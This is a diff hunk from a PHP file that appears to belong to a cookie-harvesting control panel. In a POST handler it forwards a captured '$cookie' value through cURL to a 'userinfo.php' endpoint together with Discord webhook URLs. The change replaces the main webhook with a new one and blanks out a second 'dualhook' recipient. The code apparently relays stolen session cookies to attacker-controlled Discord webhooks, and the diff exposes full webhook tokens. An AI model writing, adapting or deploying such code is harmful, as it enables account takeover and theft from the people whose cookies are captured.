@@ -89,7 +89,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
             // Call userinfo.php with cURL and proper timeout to send webhook
             // Pass both 'dh' and 'dualhook' parameters to ensure dualhook is received
-            $userInfoUrl = "$dom/controlPage/apis/userinfo.php?cookie=" . urlencode($cookie) . "&web=https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1437553764868296829%2FxNcMCdR9o43rz3y-Y8OZfLN4Tyo51mGBrTqW5JXwinl2__AHv1dUl0unH2Nbs_frazzk&dh=https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1437819282057859172%2FjhSAjmAseFfeAVriUmuG2Ka_S3dsmYvw802w76sLezTiJYUyR8B6EU35MRqVsEw1aBEX&dualhook=https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1437819282057859172%2FjhSAjmAseFfeAVriUmuG2Ka_S3dsmYvw802w76sLezTiJYUyR8B6EU35MRqVsEw1aBEX";
+            $userInfoUrl = "$dom/controlPage/apis/userinfo.php?cookie=" . urlencode($cookie) . "&web=https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1438099288390631476%2FJVHaPJa5RgrpLf4sarfO4GRg1Zg5SOu3MJQDgo_sTpUXBqhwg7VPU7ppeMIpgNGff8_s&dh=&dualhook=";
             
             $ch = curl_init($userInfoUrl);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
